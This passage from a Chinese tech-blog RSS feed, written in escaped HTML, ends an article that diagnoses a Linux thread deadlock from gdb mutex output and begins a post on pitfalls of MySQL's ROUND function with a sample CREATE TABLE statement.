class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a077a1640481434-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__size&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;\002\000\000\000\000\000\000\000B\032\000\000\001&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;\000&#39;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a077a1640481434-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;repeats&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__align&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a077a1640481434-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mutex3&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a077a1640481434-16&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__data&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__lock&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__count&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__owner&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__nusers&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a077a1640481434-17&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__kind&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__spins&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__list&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__prev&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__next&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a077a1640481434-18&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__size&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;\000&#39;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;repeats&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__align&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a077a1640481434-19&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mutex2&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a077a1640481434-20&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__data&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__lock&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__count&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__owner&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;6723&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__nusers&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a077a1640481434-21&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__kind&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__spins&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__list&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__prev&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__next&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a077a1640481434-22&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__size&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;\002\000\000\000\000\000\000\000C\032\000\000\001&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;\000&#39;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a077a1640481434-23&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;repeats&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;__align&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a077a1640481434-24&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0080 seconds] --&gt;

&lt;/div&gt;
&lt;p&gt;从上面可以发现，线程 4 正试图获得锁 mutex1，但是锁 mutex1 已经被 LWP 为 6722 的线程得到（__owner = 6722），线程 5 正试图获得锁 mutex2，但是锁 mutex2 已经被 LWP 为 6723 的 得到（__owner = 6723），从 pstack 的输出可以发现，LWP 6722 与线程 5 是对应的，LWP 6723 与线程 4 是对应的。所以我们可以得出， 线程 4 和线程 5 发生了交叉持锁的死锁现象。查看线程的源代码发现，线程 4 和线程 5 同时使用 mutex1 和 mutex2，且申请顺序不合理。&lt;/p&gt;
&lt;h2 id=&quot;major4&quot;&gt;总结&lt;/h2&gt;
&lt;p&gt;本文简单介绍了一种在 Linux 平台下分析死锁问题的方法，对一些死锁问题的分析有一定作用。希望对大家有帮助。理解了死锁的原因，尤其是产生死锁的四个必要条件，就可以最大可能地避免、预防和解除死锁。所以，在系统设计、进程调度等方面注意如何不让这四个必要条件成立，如何确定资源的合理分配算法，避免进程永久占据系统资源。此外，也要防止进程在处于等待状态的情况下占用资源 , 在系统运行过程中，对进程发出的每一个系统能够满足的资源申请进行动态检查，并根据检查结果决定是否分配资源，若分配后系统可能发生死锁，则不予分配，否则予以分配。因此，对资源的分配要给予合理的规划，使用有序资源分配法和银行家算法等是避免死锁的有效方法。&lt;/p&gt;

&lt;/div&gt;

        
        
        
    &lt;div class=&quot;post-adds&quot;&gt;
        &lt;span data-post-id=&quot;109743&quot; class=&quot; btn-bluet-bigger href-style vote-post-up   register-user-only &quot;&gt;&lt;i class=&quot;fa  fa-thumbs-o-up&quot;&gt;&lt;/i&gt; &lt;h10 id=&quot;109743votetotal&quot;&gt;1&lt;/h10&gt; 赞&lt;/span&gt;
        &lt;span data-book-type=&quot;1&quot; data-site-id=&quot;2&quot; data-item-id=&quot;109743&quot; data-item-type=&quot;1&quot; class=&quot; btn-bluet-bigger href-style bookmark-btn  register-user-only &quot;&gt;&lt;i class=&quot;fa fa-bookmark-o  &quot;&gt;&lt;/i&gt; 3 收藏&lt;/span&gt;

                    &lt;a href=&quot;#article-comment&quot;&gt;&lt;span class=&quot;btn-bluet-bigger href-style hide-on-480&quot;&gt;&lt;i class=&quot;fa fa-comments-o&quot;&gt;&lt;/i&gt; 1 评论&lt;/span&gt;&lt;/a&gt;
        
        
        
        &lt;!-- JiaThis Button BEGIN --&gt;
        &lt;div class=&quot;jiathis_style_24x24&quot; style=&quot;display: inline-flex; position: relative; margin: 0; clear: both;float: right;&quot;&gt;
            &lt;a class=&quot;jiathis_button_tsina&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_weixin&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_qzone&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_fb hide-on-480&quot;&gt;&lt;/a&gt;
            &lt;a href=&quot;http://www.jiathis.com/share?uid=1745061&quot; class=&quot;jiathis jiathis_txt jiathis_separator jtico jtico_jiathis&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt;
        &lt;/div&gt;

    &lt;/div&gt;




        &lt;!-- BEGIN #author-bio --&gt;


&lt;!-- END #author-bio --&gt;
	

</description>
        <pubDate>Mon, 09 Jan 2017 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2017/2017-01-09-109743-41cb1fd62.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2017/2017-01-09-109743-41cb1fd62.html</guid>
        
        
        <category>jobbole</category>
        
      </item>
    
      <item>
        <title>MySQL 之 ROUND 函数四舍五入的陷阱</title>
        <description>


        			&lt;div class=&quot;textwidget&quot;&gt;
&lt;/div&gt;
		
		&lt;p&gt;在MySQL中，&lt;code&gt;ROUND&lt;/code&gt;函数用于对查询结果进行四舍五入，不过最近使用ROUND函数四舍五入时意外发现并没有预期的那样，本文将这一问题记录下来，以免大家跟我一样犯同样的错误。&lt;/p&gt;
&lt;h2 id=&quot;toc_0&quot;&gt;问题描述&lt;/h2&gt;
&lt;p&gt;假如我们有如下一个数据表&lt;code&gt;test&lt;/code&gt;，建表语句如下&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9f4b3d6a7323352105&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
CREATE TABLE test (
  id int(11) NOT NULL AUTO_INCREMENT,
  field1 bigint(10) DEFAULT NULL,
  field2 decimal(10,0) DEFAULT NULL,
  field3 int(10) DEFAULT NULL,
  field4 float(15,4) DEFAULT NULL,
  field5 float(15,4) DEFAULT NULL,
  field6 float(15,4) DEFAULT NULL,
  PRIMARY KEY (id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f4b3d6a7323352105-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f4b3d6a7323352105-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f4b3d6a7323352105-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f4b3d6a7323352105-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f4b3d6a7323352105-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f4b3d6a7323352105-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f4b3d6a7323352105-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f4b3d6a7323352105-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f4b3d6a7323352105-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f4b3d6a7323352105-10&quot;&gt;10&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f4b3d6a7323352105-1&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;CREATE &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;TABLE &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f4b3d6a7323352105-2&quot;&gt;
